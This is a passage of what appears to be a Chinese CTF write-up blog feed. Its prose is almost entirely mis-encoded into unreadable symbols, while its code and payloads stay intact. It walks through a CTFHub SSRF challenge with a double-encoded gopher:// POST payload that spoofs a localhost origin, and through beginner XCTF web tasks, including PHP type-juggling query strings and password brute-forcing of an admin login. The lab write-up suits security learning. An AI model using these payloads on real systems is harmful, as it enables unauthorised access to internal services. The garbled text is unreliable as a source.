class="line"></span><br><span class="line">&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;</span><br><span class="line">&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®<code>flag.php</code>æœ€åçš„æç¤ºï¼Œ</p>
<p>å°è¯• <code>Gopher</code> åè®®å‘æœåŠ¡å™¨å‘é€ <code>POST</code> åŒ…</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">Gopheråè®®çš„æ ¼å¼:</span><br><span class="line"></span><br><span class="line">gopher:<span class="regexp">//</span>IP:port<span class="regexp">/_TCP/</span>IPæ•°æ®æµ</span><br></pre></td></tr></table></figure>

<p>å…ˆæ„é€  <code>Gopher</code>åè®®æ‰€éœ€çš„ <code>POST</code>è¯·æ±‚ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>36          </span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-sas"><span class="keyword">key</span>=11e053e2b7900523ac51fc7606b964e2</span></span><br><span class="line"><span class="language-sas"></span></span><br><span class="line"><span class="language-sas">//Content-<span class="keyword">Length</span> è¿™ä¸ªè¦å’Œåº•ä¸‹POSTå‚æ•°[åŒ…æ‹¬<span class="keyword">key</span>=,4ä¸ª]é•¿åº¦ä¸€è‡´</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™é‡Œéœ€è¦å¯¹å…¶è¿›è¡Œä¸¤æ¬¡<code>url</code>ç¼–ç </p>
<p>æ ¹æ®<code>hint</code>ï¼Œè¯·æ±‚æœ‰<code>curl</code>åŠŸèƒ½</p>
<p>åœ¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œé¦–å…ˆæµè§ˆå™¨ä¼šè¿›è¡Œä¸€æ¬¡ <code>URL</code>è§£ç ï¼Œ</p>
<p>å…¶æ¬¡æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œåœ¨æ‰§è¡Œ<code>curl</code>åŠŸèƒ½æ—¶ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡ <code>URL</code>è§£ç </p>
<p>å› æ­¤éœ€è¦ä¸¤æ¬¡<code>url</code>ç¼–ç </p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`æ³¨`ï¼š</span><br><span class="line">åœ¨ç¬¬ä¸€æ¬¡ç¼–ç åçš„æ•°æ®ä¸­ï¼Œå°†`%<span class="number">0</span>A`å…¨éƒ¨æ›¿æ¢ä¸º`%<span class="number">0</span>D%<span class="number">0</span>A`ã€‚</span><br><span class="line"></span><br><span class="line">å› ä¸º Gopheråè®®åŒ…å«çš„è¯·æ±‚æ•°æ®åŒ…ä¸­ï¼Œå¯èƒ½åŒ…å«æœ‰`=`ã€`&amp;`ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œ</span><br><span class="line">é¿å…ä¸æœåŠ¡å™¨è§£æä¼ å…¥çš„å‚æ•°é”®å€¼å¯¹æ··æ·†ï¼Œæ‰€ä»¥å¯¹æ•°æ®åŒ…è¿›è¡Œ URLç¼–ç ï¼Œè¿™æ ·æœåŠ¡ç«¯ä¼šæŠŠ`%`åçš„å­—èŠ‚å½“åšæ™®é€šå­—èŠ‚ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-CTFHub/image-20220925231951671.png" alt="image-20220925231951671"></p>
<p>ç„¶åç¬¬äºŒæ¬¡ç¼–ç </p>
<p><img src="/post/wp-CTFHub/image-20220925232013164.png" alt="image-20220925232013164"></p>
<p>å¾—åˆ°</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span>%<span class="number">2520</span>%<span class="number">252</span>Fflag.php%<span class="number">2520</span>HTTP%<span class="number">252</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">253</span>A80%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">252036</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">252</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Akey%<span class="number">253</span>D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆå› ä¸º<code>flag.php</code>é‡Œæœ‰<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç›´æ¥åœ¨è¾“å…¥æ¡†ï¼Œä¸Šä¼ POSTè¯·æ±‚åˆä¼šæ˜¾ç¤º</p>
<p><img src="/post/wp-CTFHub/image-20220925222739689.png" alt="image-20220925222739689"></p>
<p>è¿™ä¸ªæƒ³ç»•è¿‡ï¼Œå°±åªæœ‰é€šè¿‡<code>index.php</code>çš„<code>curl</code>åŠŸèƒ½ï¼Œåˆ©ç”¨Gopheråè®®ä»<code>127.0.0.1</code>å‘ç›®æ ‡å‘é€<code>POST</code>è¯·æ±‚</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">80</span>/_POST%252<span class="number">0</span>%252Fflag.php%2520HTTP%252F1.<span class="number">1</span>%250D%250AHost%253A%2520127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%253A8<span class="number">0</span>%250D%250AContent-Length%253A%252036%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-CTFHub/image-20220925232055769.png" alt="image-20220925232055769"></p>
<p>å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>æ”»é˜²ä¸–ç•Œé¶åœºwp</title>
    <url>//post/wp-Gongfang/</url>
    <content><![CDATA[<p><code>è¿™ä¸ªçº¿ä¸Šé¶åœºæ„Ÿè§‰å¾ˆé€‚åˆå…¥é—¨ï¼Œè€Œä¸”éš¾åº¦åˆ†å¸ƒä¹Ÿå¥½ï¼Œå¾ˆä¼˜ç§€çš„çº¿ä¸Šé¶åœºï¼Œéå¸¸å€¼å¾—ä»”ç»†å­¦ä¹ ç ”ç©¶ä¸€ä¸‹</code></p>
<p><code>...åŠŸé˜²ä¸–ç•Œçªç„¶æ”¹ç‰ˆäº†ï¼ŒæŠŠé¢˜å¼„æˆä¸€å †äº†ï¼Œä¸è¿‡è¿˜æ˜¯æœ‰éš¾åº¦ç³»æ•°ï¼Œä¸è¿‡ä¹Ÿæ–¹ä¾¿çœ‹çœ‹æœ‰å“ªäº›é€‚åˆéš¾åº¦çš„é¢˜ç›®åšä¸€åš</code></p>
<span id="more"></span>

<h1 id="Webæ–°æ‰‹"><a href="#Webæ–°æ‰‹" class="headerlink" title="Webæ–°æ‰‹"></a>Webæ–°æ‰‹</h1><h2 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h2><h3 id="1-é¢˜ç›®æè¿°"><a href="#1-é¢˜ç›®æè¿°" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆè®©å°å®åŒå­¦æŸ¥çœ‹ä¸€ä¸ªç½‘é¡µçš„æºä»£ç ï¼Œä½†å°å®åŒå­¦å‘ç°é¼ æ ‡å³é”®å¥½åƒä¸ç®¡ç”¨äº†</p>
<h3 id="2-wp"><a href="#2-wp" class="headerlink" title="2)wp"></a>2)wp</h3><p>å³é”®ä¸ç®¡ç”¨ï¼Œç›´æ¥ç”¨F12æŸ¥çœ‹</p>
<p>å¾—åˆ°flag</p>
<h2 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h2><h3 id="1-é¢˜ç›®æè¿°-1"><a href="#1-é¢˜ç›®æè¿°-1" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆä¸Šè¯¾è®²äº†<code>Robots</code>åè®®ï¼Œå°å®åŒå­¦å´ä¸Šè¯¾æ‰“äº†çŒç¡ï¼Œèµ¶ç´§æ¥æ•™æ•™å°å®<code>Robots</code>åè®®æ˜¯ä»€ä¹ˆå§</p>
<h3 id="2-wp-1"><a href="#2-wp-1" class="headerlink" title="2)wp"></a>2)wp</h3><p>ä¸æ¸…æ¥š<code>robots</code>åè®®æ˜¯ä»€ä¹ˆï¼Œäºæ˜¯æˆ‘ç™¾åº¦äº†ä¸€ä¸‹ï¼Œ</p>
<p><code>robotsåè®®ä¹Ÿç§°çˆ¬è™«åè®®ã€çˆ¬è™«è§„åˆ™ç­‰,æ˜¯æŒ‡ç½‘ç«™å¯å»ºç«‹ä¸€ä¸ªrobots.txtæ–‡ä»¶æ¥å‘Šè¯‰æœç´¢å¼•æ“å“ªäº›é¡µé¢å¯ä»¥æŠ“å–,å“ªäº›é¡µé¢ä¸èƒ½æŠ“å–,è€Œæœç´¢å¼•æ“åˆ™é€šè¿‡è¯»å–robots.txtæ–‡ä»¶æ¥è¯†åˆ«è¿™ä¸ªé¡µé¢æ˜¯å¦å…è®¸è¢«æŠ“å–</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´ç½‘ç«™ä¸‹æœ‰ä¸€ä¸ªrobots.txtæ–‡ä»¶ï¼Œè§„å®šäº†é¡µé¢æŠ“å–è§„åˆ™ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è®¿é—®<code>http://111.200.241.244:54251/robots.txt</code></p>
<p>ç•Œé¢æ˜¾ç¤ºå¦‚ä¸‹</p>
<p><img src="/post/wp-Gongfang/image-20220621223828917.png" alt="image-20220621223828917"></p>
<p>disallowå°±æ˜¯ä¸å…è®¸æŠ“å–çš„é¡µé¢ï¼Œçœ‹åˆ°flagï¼Œå°±çŸ¥é“æˆ‘ä»¬å°±è¦è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯è®¿é—®<code>http://111.200.241.244:54251/f1ag_1s_h3re.php</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h2><h3 id="1-é¢˜ç›®æè¿°-2"><a href="#1-é¢˜ç›®æè¿°-2" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå¿˜è®°åˆ é™¤å¤‡ä»½æ–‡ä»¶ï¼Œä»–æ´¾å°å®åŒå­¦å»æŠŠå¤‡ä»½æ–‡ä»¶æ‰¾å‡ºæ¥,ä¸€èµ·æ¥å¸®å°å®åŒå­¦å§ï¼</p>
<h3 id="2-wp-2"><a href="#2-wp-2" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åˆ°æ‰¾æ–‡ä»¶ï¼Œé¦–å…ˆæˆ‘å°±æƒ³ç”¨dirsearchæ‰«ä¸€æ‰«</p>
<p>æ‰“å¼€é¶åœºå…ˆçœ‹åˆ°</p>
<p><img src="/post/wp-Gongfang/image-20220621224315003.png" alt="image-20220621224315003"></p>
<p>äºæ˜¯æˆ‘å…ˆæ‰«ä¸€æ‰«ï¼Œçœ‹ä¸€çœ‹æœ‰æ²¡æœ‰ index.phpæ–‡ä»¶çš„æ–‡ä»¶å</p>
<p><img src="/post/wp-Gongfang/image-20220621224424076.png" alt="image-20220621224424076"></p>
<p>æ‰«å®Œåå‘ç°index.php.bakæ–‡ä»¶ï¼Œå¾ˆæ˜æ˜¾å®ƒå°±æ˜¯å¤‡ä»½æ–‡ä»¶ï¼Œæˆ‘ä»¬å°è¯•ç›´æ¥è®¿é—®å®ƒä¸€ä¸‹<code>http://111.200.241.244:52824/index.php.bak</code></p>
<p>è‡ªåŠ¨ä¸‹è½½å¥½äº†index.php.bakï¼Œç”¨æ–‡æœ¬æ‰“å¼€</p>
<p>å¾—åˆ°flag</p>
<h2 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h2><h3 id="1-é¢˜ç›®æè¿°-3"><a href="#1-é¢˜ç›®æè¿°-3" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå‘Šè¯‰å°å®ä»–åœ¨cookieé‡Œæ”¾äº†äº›ä¸œè¥¿ï¼Œå°å®ç–‘æƒ‘åœ°æƒ³ï¼šè¿™æ˜¯å¤¹å¿ƒé¥¼å¹²çš„æ„æ€å—ï¼Ÿ</p>
<h3 id="2ï¼‰wp"><a href="#2ï¼‰wp" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>æˆ‘çš„æ—¥å¸¸éšè®°ç¬¬ä¸€ç« å¤§æ¦‚è®²äº†cookieçš„ä½œç”¨å’Œå«ä¹‰ï¼Œè¯¥é¢˜å¯ä»¥ä¸äº†è§£ä¹Ÿå¯ä»¥å®Œæˆ</p>
<p>ç›®å‰æˆ‘çœ‹cookieçš„æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯burpsuiteæŠ“åŒ…çœ‹ï¼Œå¦ä¸€ä¸ªå°±æ˜¯ç”¨ç«ç‹æ’ä»¶Tamper Dataï¼Œè¿™é‡Œæˆ‘ç”¨brup</p>
<p>æˆ‘ä»¬å…ˆç”¨burpsuiteæŠ“ä¸€ä¸ªåŒ…çœ‹çœ‹</p>
<p><img src="/post/wp-Gongfang/image-20220621225826671.png" alt="image-20220621225826671"></p>
<p>å‘ç°cookieå¤„æç¤ºæœ‰ä¸ªcookie.phpæ–‡ä»¶ï¼Œè®¿é—®<code>http://111.200.241.244:49599/cookie.php</code>çœ‹çœ‹ï¼Œå¦‚ä¸‹</p>
<p><img src="/post/wp-Gongfang/image-20220621225920306.png" alt="image-20220621225920306"></p>
<p>äºæ˜¯æˆ‘ä»¬æŠŠæŠ“åŒ…æ•°æ®å‘åˆ°repeateré‡Œçœ‹çœ‹response</p>
<p>å¾—åˆ°flag</p>
<h2 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h2><h3 id="1-é¢˜ç›®æè¿°-4"><a href="#1-é¢˜ç›®æè¿°-4" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆä»Šå¤©ä¸Šè¯¾è®²äº†å‰ç«¯çŸ¥è¯†ï¼Œç„¶åç»™äº†å¤§å®¶ä¸€ä¸ªä¸èƒ½æŒ‰çš„æŒ‰é’®ï¼Œå°å®æƒŠå¥‡åœ°å‘ç°è¿™ä¸ªæŒ‰é’®æŒ‰ä¸ä¸‹å»ï¼Œåˆ°åº•æ€ä¹ˆæ‰èƒ½æŒ‰ä¸‹å»å‘¢ï¼Ÿ</p>
<h3 id="2-wp-3"><a href="#2-wp-3" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¯¥é¢˜è¯´æŒ‰è¿™ä¸ªæŒ‰é’®ä¸èƒ½æŒ‰ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¸èƒ½æŒ‰ï¼Œçœ‹çœ‹æºç </p>
<p><img src="/post/wp-Gongfang/image-20220621230709669.png" alt="image-20220621230709669"></p>
<p>çœ‹åˆ°æœ‰ä¸ªdisabledï¼Œå°±æ˜¯å®ƒä½¿å¾—æŒ‰é’®æ— æ³•è¢«æŒ‰ï¼Œæ‰€ä»¥åˆ å»å°±å¯ä»¥</p>
<p>æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œåœ¨æŸ¥çœ‹å™¨é‡Œé¢ï¼ŒæŠŠdisabledè¯­å¥åˆ å»</p>
<p>æŒ‰é’®å°±å¯ä»¥æŒ‰äº†ï¼Œç‚¹å‡»</p>
<p>å¾—åˆ°flag</p>
<h2 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h2><h3 id="1-é¢˜ç›®æè¿°-5"><a href="#1-é¢˜ç›®æè¿°-5" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®å†™äº†ä¸€ä¸ªç™»é™†éªŒè¯é¡µé¢ï¼Œéšæ‰‹å°±è®¾äº†ä¸€ä¸ªå¯†ç ã€‚</p>
<h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>å¼€å§‹æˆ‘ä»¬å…ˆéšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¼¹çª—æ˜¾ç¤º</p>
<p><img src="/post/wp-Gongfang/image-20220623115614924.png" alt="image-20220623115614924"></p>
<p>äºæ˜¯æˆ‘ä»¬çŸ¥é“ç”¨æˆ·åæ˜¯  adminï¼Œä½†æ˜¯å¯†ç ä¸çŸ¥é“ï¼ŒåªçŸ¥é“æ˜¯éšæ‰‹è¾“å…¥çš„ï¼Œæˆ‘ä»¬è¯•è¯•burpæŠ“åŒ…çœ‹çœ‹æœ‰æ²¡æœ‰æç¤º</p>
<p>åœ¨responseé‡Œçœ‹åˆ°</p>
<p><img src="/post/wp-Gongfang/image-20220623115811366.png" alt="image-20220623115811366"></p>
<p>è¿™é‡Œæˆ‘ä»¬å°±çŸ¥é“è¦ç”¨burpçš„å¯†ç çˆ†ç ´ï¼Œå…·ä½“æ“ä½œå°±ä¸ç»†è®²ï¼Œéšè®°æœ‰å†™</p>
<p>è¿™æ˜¯éƒ¨åˆ†å¯†ç txtçš„ç½‘ç«™ï¼Œå¯ä»¥ä¸‹è½½ä½¿ç”¨ï¼Œé’ˆå¯¹ä¸åŒç¯å¢ƒï¼Œç”¨ä¸åŒå¯†ç æ–‡æœ¬</p>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
<p>æœ€åçˆ†å‡ºå¯†ç 123456,ä»¥ç”¨æˆ· adminè¾“å…¥ç™»å½•</p>
<p>å¾—åˆ°flag</p>
<h2 id="7-simple-php"><a href="#7-simple-php" class="headerlink" title="7.simple_php"></a>7.simple_php</h2><h3 id="1-é¢˜ç›®æè¿°-6"><a href="#1-é¢˜ç›®æè¿°-6" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®å¬è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€,äºæ˜¯å¥¹ç®€å•å­¦ä¹ ä¹‹åå†™äº†å‡ è¡Œphpä»£ç ã€‚</p>
<h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆè¿›è¡Œä»£ç åˆ†æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>); </span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; </span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;   <span class="keyword">echo</span> <span class="variable">$flag1</span>; </span><br><span class="line">&#125; <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(); &#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;   </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag2</span>; &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°flagè¢«åˆ†æˆäº†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªflag1ï¼Œä¸€ä¸ª flag2</p>
<p>a,bä¸¤ä¸ªå˜é‡ä»¥getå‹è¾“å…¥</p>
<p>ç¬¬ä¸€ä¸ªifè¦æ±‚a&#x3D;&#x3D;0ä¸”aä¸ºtureï¼Œè¿™æ˜æ˜¾çŸ›ç›¾ï¼Œå½“a&#x3D;0å°±ä»£è¡¨aä¸ºfalse</p>
<p>æ‰€ä»¥è¿™é‡Œæ¶‰åŠäº†phpæ€§è´¨ï¼Œphpå±äºä¸€é—¨å¼±ç±»å‹è¯­è¨€</p>
<p><code>å¼±ç±»å‹ï¼šä¸å¿…å‘ PHP å£°æ˜è¯¥å˜é‡çš„æ•°æ®ç±»å‹ï¼ŒPHP ä¼šæ ¹æ®å˜é‡çš„å€¼ï¼Œè‡ªåŠ¨æŠŠå˜é‡è½¬æ¢ä¸ºæ­£ç¡®çš„æ•°æ®ç±»å‹</code></p>
<p>æ‰€ä»¥å½“åœ¨ç¬¬ä¸€ä¸ªifåˆ¤æ–­açš„å€¼æ—¶ï¼Œaå¯ä»¥åˆ©ç”¨å¼±ç±»å‹æ€§è´¨ï¼Œa&#x3D;0Aï¼Œå½“è¿›è¡Œa&#x3D;&#x3D;0åˆ¤æ–­æ—¶ï¼Œä¼šè‡ªåŠ¨æŠŠaå½“ä½œæ•°å­—å‹ï¼Œä¹Ÿå°±æ˜¯æŠŠa&#x3D;0Aåçš„Aå»æ‰ï¼Œä»è€Œæˆç«‹ï¼›</p>
<p>è€Œå½“åˆ¤æ–­aæ˜¯å¦ä¸ºtureæ—¶ï¼Œç”±äºa&#x3D;0Aè€Œé0ï¼Œæ‰€ä»¥ç»“æœä¸ºtureï¼Œè¾“å‡ºflag1</p>
<p><em>è¿™é‡Œæ€è€ƒä¸€ä¸‹ï¼Œå¦‚æœæ˜¯ <code>if( $a===0 and $a )&#123; echo $flag1; &#125;</code>ï¼Œé‚£æŒ‰ä¸Šé¢å¯¹aèµ‹å€¼è¿˜å¯ä»¥å—ï¼Ÿ</em></p>
<p><em>è¿™é‡Œæ¶‰åŠphpç±»å‹æ¯”è¾ƒ&#x3D;&#x3D;ä¸&#x3D;&#x3D;&#x3D;çš„åŒºåˆ«</em></p>
<ul>
<li><em>æ¾æ•£æ¯”è¾ƒï¼šä½¿ç”¨ä¸¤ä¸ªç­‰å· <strong>&#x3D;&#x3D;</strong> æ¯”è¾ƒï¼Œåªæ¯”è¾ƒå€¼ï¼Œä¸æ¯”è¾ƒç±»å‹ã€‚</em></li>
<li><em>ä¸¥æ ¼æ¯”è¾ƒï¼šç”¨ä¸‰ä¸ªç­‰å· <strong>&#x3D;&#x3D;&#x3D;</strong> æ¯”è¾ƒï¼Œé™¤äº†æ¯”è¾ƒå€¼ï¼Œä¹Ÿæ¯”è¾ƒç±»å‹ã€‚</em></li>
</ul>
<p><em>ä¸Šé¢ä»£ç ä¸­&#x3D;&#x3D;å¯¹ç±»å‹ä¸æ¯”è¾ƒï¼Œæ‰€ä»¥a&#x3D;0Aä¸0æ¯”è¾ƒæ—¶ï¼Œå¯å½“ä½œa&#x3D;0ä¸0æ¯”è¾ƒ</em></p>
<p><em>ä½†æ˜¯å½“ä¸º&#x3D;&#x3D;&#x3D;æ—¶ï¼Œa&#x3D;0Aä¸å±äºæ•°å­—å‹ï¼Œæ‰€ä»¥å½“if(a&#x3D;&#x3D;&#x3D;0)è¿”å›falseï¼Œä»è€Œè¿”å›false</em></p>
<p>ç¬¬äºŒä¸ªifçœ‹åˆ°ï¼Œis_numeric($b)ï¼Œè¿™é‡Œè¦äº†è§£ä¸€ä¸‹is_numereic()å‡½æ•°çš„ä½œç”¨</p>
<p><code>is_numeric()å‡½æ•°ï¼šç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEï¼Œæ³¨æ„æµ®ç‚¹å‹è¿”å› 1ï¼Œå³ TRUE</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´bçš„å€¼ä¸èƒ½ä¸ºæ•°å­—å’Œæ•°å­—ä¸²ï¼Œä½†æ˜¯ç¬¬ä¸‰ä¸ªifè¦æ±‚b&gt;1234ï¼Œæ‰€ä»¥bè¦ä¸ºæ•°å­—</p>
<p>è¿™ä¸ªå’Œaä¸€æ ·ï¼Œåˆ©ç”¨äº†phpçš„å¼±ç±»å‹æ€§è´¨ï¼Œæ—¢ç„¶ä¸èƒ½ä¸ºæ•°å­—ï¼Œé‚£b&#x3D;1235Bï¼Œè¿™æ ·å½“bä¸1234æ¯”è¾ƒæ—¶ï¼Œbè½¬åŒ–ä¸ºæ•°å­—å‹ï¼Œå»æ‰Bï¼Œ1235&gt;1234æˆç«‹ï¼Œè¾“å‡ºflag2</p>
<p>äºæ˜¯payloadä¸º</p>
<p><code>http://111.200.241.244:51156/?a=0A&amp;b=1235B</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="8-get-post"><a href="#8-get-post" class="headerlink" title="8.get_post"></a>8.get_post</h2><h3 id="1-é¢˜ç›®æè¿°-7"><a href="#1-é¢˜ç›®æè¿°-7" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå‘Šè¯‰å°å®åŒå­¦HTTPé€šå¸¸ä½¿ç”¨ä¸¤ç§è¯·æ±‚æ–¹æ³•ï¼Œä½ çŸ¥é“æ˜¯å“ªä¸¤ç§å—ï¼Ÿ</p>
<h3 id="2ï¼‰wp-1"><a href="#2ï¼‰wp-1" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>Getå’ŒPostæ–¹å¼æ˜¯HTTPé€šå¸¸ä½¿ç”¨ä¸¤ç§è¯·æ±‚æ–¹æ³•</p>
<p>Getæ–¹å¼ç›´æ¥åœ¨urlè¾“å…¥?a&#x3D;1</p>
<p><code>http://111.200.241.244:52081/?a=1</code></p>
<p>Postæ–¹å¼åˆ©ç”¨ç«ç‹æ’ä»¶HackerBarä»¥postæ–¹å¼b&#x3D;2</p>
<p>run</p>
<p><img src="/post/wp-Gongfang/image-20220624164728734.png" alt="image-20220624164728734"></p>
<p>å¾—åˆ°flag</p>
<h2 id="9-xff-referer"><a href="#9-xff-referer" class="headerlink" title="9.xff_referer"></a>9.xff_referer</h2><h3 id="1-é¢˜ç›®æè¿°-8"><a href="#1-é¢˜ç›®æè¿°-8" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>Xè€å¸ˆå‘Šè¯‰å°å®å…¶å®xffå’Œrefereræ˜¯å¯ä»¥ä¼ªé€ çš„</p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆäº†è§£ä»€ä¹ˆæ˜¯xxfå’Œreferer</p>
